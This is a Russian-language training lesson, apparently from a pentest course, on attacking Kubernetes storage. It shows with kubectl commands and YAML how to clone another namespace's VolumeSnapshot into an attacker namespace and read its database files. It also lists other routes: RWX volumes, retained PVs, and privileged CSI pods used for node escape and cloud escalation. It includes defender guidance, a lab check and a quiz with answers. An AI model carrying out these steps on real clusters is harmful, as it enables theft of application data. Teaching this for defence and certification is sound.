---
id: cloud-k8s-csi
title: "CSI и storage в Kubernetes: снапшоты, PV и кража данных"
category: cloud
parent: cloud-k8s-deep
difficulty: expert
order: 3
tags: [cloud, kubernetes, csi, storage, persistentvolume, snapshot, hostpath]
prerequisites: [cloud-k8s-deep, cloud-kubernetes-rbac]
useful_for:
  - "Кража данных из томов Kubernetes"
  - "Атаки на CSI-драйверы"
  - "Понимание storage-модели кластера"
estimated_minutes: 50
summary: "Как устроены CSI, PersistentVolume, StorageClass и снапшоты в Kubernetes, и как через клонирование томов, перепривязку PVC и привилегированные CSI-поды добраться до чужих данных и узла."
lab:
  kind: shell
  title: "Практика: CSI и storage в Kubernetes"
  toolset: [core, kubectl]
  workdir: /home/student/k8scsi
  files: [task.md, notes.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Перечисли PersistentVolumes: `kubectl get pv -o yaml`."
    - "Найди PV с данными приложения; прочитай его содержимое через под."
    - "Найди флаг: сохрани вывод и `grep nto pv.txt > found.txt`."

---

## Задача

В прошлых уроках мы искали секреты в API и etcd. Но приложения хранят свои данные не в Kubernetes-объектах, а в **томах** — подключённых дисках. Там лежат базы данных, приватные ключи, дампы. Цель урока: из namespace `attacker` прочитать данные тома, привязанного к поду в namespace `prod`.

## Данные, с которыми работаем

Разберём storage-модель на объектах. Нам важно четыре понятия:

- **PersistentVolume (PV)** — сам том (облачный диск, NFS). Глобальный объект.
- **PersistentVolumeClaim (PVC)** — «заявка» на том внутри namespace; связывается с PV.
- **StorageClass (SC)** — класс хранилища: какой драйвер (CSI) создаёт том и с какими параметрами.
- **VolumeSnapshot** — снимок тома на определённый момент. Ключевая вещь для нас.

Начинаем с инвентаризации:

```bash
$ kubectl get pvc,volumesnapshot -A
NAMESPACE   NAME        STATUS   VOLUME   CAPACITY
prod        db-data     Bound    pvc-9f..  50Gi

NAMESPACE   NAME             READYTOUSE   SOURCEPVC
prod        db-snap-2026     true         db-data
```

В namespace `prod` есть том `db-data` и его **снапшот** `db-snap-2026`. Снапшот — это «замороженная» копия тома. Если мы умеем создавать PVC, мы, возможно, сумеем **склонировать** этот снапшот в свой namespace и прочитать данные, не трогая оригинал.

## Шаг 1: проверяем права

Прежде чем что-то делать — смотрим, что нам разрешено:

```bash
$ kubectl auth can-i create persistentvolumeclaims -n attacker
yes
$ kubectl auth can-i create persistentvolumeclaims/status -n attacker
no
$ kubectl get storageclass
NAME   PROVISIONER              RECLAIMPOLICY
fast   ebs.csi.aws.com          Delete
```

Нам можно создавать PVC в своём namespace. Проверяем StorageClass `fast` — он управляется драйвером `ebs.csi.aws.com` (CSI-плагин AWS EBS). Снапшот нужно восстанавливать в **тот же** StorageClass, поэтому запоминаем имя `fast`.

## Шаг 2: клонируем снапшот в свой namespace

PVC умеет брать данные из снапшота через поле `dataSource`. Создаём PVC `stolen-data` в `attacker`:

```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: stolen-data
  namespace: attacker
spec:
  accessModes: ["ReadWriteOnce"]
  storageClassName: fast
  resources:
    requests:
      storage: 50Gi
  dataSource:
    name: db-snap-2026
    kind: VolumeSnapshot
    apiGroup: snapshot.storage.k8s.io
```

Применяем:

```bash
$ kubectl apply -f pvc.yaml
persistentvolumeclaim/stolen-data created
$ kubectl get pvc -n attacker
NAME          STATUS   VOLUME     CAPACITY
stolen-data   Bound    pvc-4a..   50Gi
```

PVC `Bound` — значит, CSI-драйвер создал новый том и **скопировал в него данные снапшота**. Мы получили свою копию чужой базы.

## Шаг 3: читаем данные

Монтируем PVC в под и смотрим, что внутри:

```bash
$ kubectl run reader --image=alpine -n attacker \
    --overrides='{"spec":{"containers":[{"name":"reader","image":"alpine",
    "command":["sh","-c","ls -la /data; sleep 3600"],
    "volumeMounts":[{"name":"d","mountPath":"/data"}]}],
    "volumes":[{"name":"d","persistentVolumeClaim":{"claimName":"stolen-data"}}]}}'
pod/reader created
$ kubectl exec -n attacker reader -- ls /data
mysql
$ kubectl exec -n attacker reader -- head -c 200 /data/mysql/ibdata1
... данные InnoDB ...
```

Мы читаем файлы базы данных из другого namespace. Обрати внимание: мы **не** обходили RBAC на чтение PVC — мы использовали **легитимную операцию** (создание PVC из снапшота), которую RBAC не запретил.

## Полный прогон от начала до конца

1. Нашли снапшот `db-snap-2026` в `prod`.
2. Проверили права → можно создавать PVC.
3. Создали PVC из снапшота в `attacker` через `dataSource`.
4. Смонтировали и прочитали данные БД.

## Если не сработало: другие пути к томам

- **RWX-тома.** Том с `accessModes: ReadWriteMany` монтируется несколькими подами сразу. Если ты в одном из них — читаешь данные всех.
- **Освобождённые PV.** При `reclaimPolicy: Retain` том остаётся после удаления PVC. Если его `claimRef` позволяет, новый PVC может его «подхватить».
- **`VolumeAttachment`.** Право на этот объект позволяет прикрепить чужой том к своему узлу.
- **Секреты драйвера.** StorageClass/CSI может ссылаться на Secret с кредами облачного storage — доступ к нему даёт доступ к бакетам и дискам.

## Если получил exec в CSI-под: путь к узлу

Отдельная поверхность — **CSI node-плагин**. Это DaemonSet, который монтирует тома на узле, поэтому он запущен **привилегированно** и с доступом к хостовым путям. Проверяем:

```bash
$ kubectl get pods -A -o json | jq -r '.items[] | select(.metadata.name|test("csi")) |
    "\(.metadata.namespace)/\(.metadata.name) privileged=\(.spec.containers[0].securityContext.privileged)"'
kube-system/ebs-csi-node-abc privileged=true
kube-system/ebs-csi-controller-xyz privileged=false
```

Node-плагин привилегированный. Если получишь в нём exec, ты фактически на узле — это побег, разобранный в `cloud-kubernetes-escape`. А **controller-часть** CSI в managed-кластере держит облачную роль (через IRSA/Workload Identity) с правами `ec2:CreateSnapshot`, `ec2:AttachVolume`. Exec в неё или кража SA-токена даёт эти права в AWS — возможность скопировать EBS-том любого инстанса.

## Частые ошибки и подводные камни

- **Считать storage «неинтересным».** В томах лежат базы, ключи и дампы — это данные приложений.
- **Забывать про namespace-ограничения.** Снапшот и PVC могут быть в разных namespace; проверяйте, что реально разрешено.
- **Путать PV и PVC.** PV глобальный, PVC — в namespace; права на них разные.
- **Не проверять node-плагин.** Именно он привилегированный и даёт побег, а не controller-часть.
- **Игнорировать destructive-риск.** Удаление PVC с `reclaimPolicy: Delete` уничтожает данные — согласуйте такие операции заранее.

## Что мы теперь знаем

- Данные приложений лежат в томах: PV ↔ PVC ↔ StorageClass ↔ CSI-драйвер.
- `VolumeSnapshot` можно восстановить в PVC **своего** namespace через `dataSource`.
- RBAC на создание PVC часто не запрещает клонирование снапшота — это и есть дыра.
- RWX-тома и освобождённые `Retain`-PV — дополнительные пути к данным.
- CSI node-плагин привилегированный → побег на узел; controller-часть держит облачные права.
- `reclaimPolicy: Delete` уничтожает том при удалении PVC — destructive-риск.

## На что смотреть дальше

- **k8s-operator**: контроллеры и CRD, которые тоже могут давать доступ к томам и секретам.
- **k8s-image-supply-chain**: подмена образов, в том числе CSI-плагинов.
- **cloud-privesc-iam**: что делать с облачными правами, добытыми через controller-под.

## Глазами защитника

RBAC на storage-ресурсы выдают узко: право создавать `VolumeSnapshot` и восстанавливать PVC из снапшота часто означает доступ к чужим данным, поэтому его ограничивают конкретными namespace и StorageClass. Cross-namespace restore по возможности запрещают через admission-политику, а `VolumeSnapshotClass` не оставляют доступным «всем».

Service account CSI-плагина получает минимально необходимые облачные права (создание/attach томов только для нужных зон и типов). В audit-логах отслеживают необычные `create volumesnapshot`, attach чужих PV и попытки восстановления в namespace, которые к тому не относятся. Шифрование томов (KMS) и политики удаления снапшотов снижают ущерб, если копию всё же удалось создать.

## Частые вопросы

**Что такое CSI и почему он интересен атакующему?**

Container Storage Interface — плагин, через который Kubernetes работает с дисками облака (EBS, Persistent Disk, Azure Disk). Он умеет создавать тома, снапшоты и подключать их к подам. У CSI-подов обычно широкие облачные права, а сам доступ к томам — прямой путь к чужим данным.

**Как украсть данные через CSI?**

Если есть право создать `VolumeSnapshot` из чужого `PersistentVolumeClaim` и восстановить снапшот в свой namespace, ты получаешь полную копию чужих данных. Дальше монтируешь том в свой под и читаешь содержимое — файлы, БД, конфиги с секретами.

**Почему exec в CSI-под — сильный ход?**

CSI-под часто запущен с облачной идентичностью и правами на создание/attach томов. Получив в нём exec, ты наследуешь эти права: можешь создавать снапшоты, читать любые тома, а иногда и выйти на узел. Это превращает «скучный» storage-компонент в эскалацию до облака.

**Что проверять в первую очередь?**

RBAC на `volumesnapshots` и `persistentvolumeclaims` в чужих namespace, `StorageClass` с `allowVolumeExpansion`, service account CSI-плагина и его ClusterRole. Также смотри, есть ли `VolumeSnapshotClass` и разрешено ли восстановление из снапшота в другой namespace.

**Как ограничить этот риск?**

RBAC на снапшоты только для нужных namespace, отдельные SA с минимальными правами на конкретные StorageClass, запрет cross-namespace restore, аудит `VolumeSnapshot` и мониторинг необычных attach-операций.

**Можно ли обойтись без снапшота?**

Да: если есть право создавать поды с чужим PVC (или ephemeral-тома), ты монтируешь чужой том напрямую в свой под. Снапшот — лишь один способ; прямой mount требует меньших прав и оставляет другой след в audit-логе.

**Почему CSI-права часто недооценивают?**

Они выглядят «про storage» и не связаны с секретами или RBAC, поэтому их выдают шире, чем нужно. А на деле доступ к томам = доступ к данным приложений и БД, то есть к самой ценной информации кластера.

**Как понять, что перед нами CSI, а не обычный storage?**

Смотри название StorageClass и драйвер: `ebs.csi.aws.com`, `pd.csi.storage.gke.io`, `disk.csi.azure.com` — это CSI-плагины. Их SA и ClusterRole показывают облачные права, а наличие `VolumeSnapshotClass` — доступность снапшотов.

## Квиз

Проверь себя.

```quiz
- question: "Что позволяет сделать VolumeSnapshot атакующему с правом создавать PVC?"
  options:
    - "Склонировать том в свой namespace и прочитать данные"
    - "Удалить весь кластер"
    - "Получить root на узле напрямую"
    - "Изменить NetworkPolicy"
  answer: 0
  explanation: "PVC с dataSource=VolumeSnapshot восстанавливает копию тома, доступную в вашем namespace."
- question: "Почему CSI node-плагин опасен?"
  options:
    - "Он привилегированный и имеет доступ к файловой системе узла"
    - "Он только читает метрики"
    - "Он не имеет томов"
    - "Он работает только в облаке"
  answer: 0
  explanation: "Node-плагин монтирует тома на узле и обычно запущен privileged с hostPath."
- question: "Что означает ReadWriteMany?"
  options:
    - "Том может быть смонтирован несколькими подами одновременно"
    - "Том только для чтения"
    - "Том привязан к одному узлу"
    - "Том зашифрован"
  answer: 0
  explanation: "RWX разрешает монтирование несколькими узлами/подами (зависит от драйвера)."
- question: "Что произойдёт с PV при reclaimPolicy: Delete?"
  options:
    - "Том будет удалён при удалении PVC"
    - "Том сохранится"
    - "Том станет публичным"
    - "Том скопируется в S3"
  answer: 0
  explanation: "Delete удаляет нижележащий том вместе с PVC; Retain сохраняет его."
- question: "Почему controller-часть CSI в managed-кластере ценна для атакующего?"
  options:
    - "Она держит облачную роль с правами на создание и прикрепление дисков"
    - "Она хранит пароли пользователей"
    - "Она отвечает за DNS"
    - "Она балансирует трафик"
  answer: 0
  explanation: "Controller-под использует IRSA/Workload Identity с правами на облачный storage."
```

## Куда дальше

В следующем уроке мы разберём **операторы и CRD** — пользовательские контроллеры Kubernetes, которые часто имеют широкие права и становятся неожиданным путём к данным и узлам. А пока главное запомни: **storage — это данные**, и легитимная операция клонирования снапшота часто весит больше, чем любой эксплойт.

## Где пригодится

- **Пентест:** кража данных и побег через storage.
- **Red team:** доступ к БД и секретам кластера.
- **Blue team:** аудит RBAC на PVC/снапшоты и pod security.
- **Сертификация:** CKS.
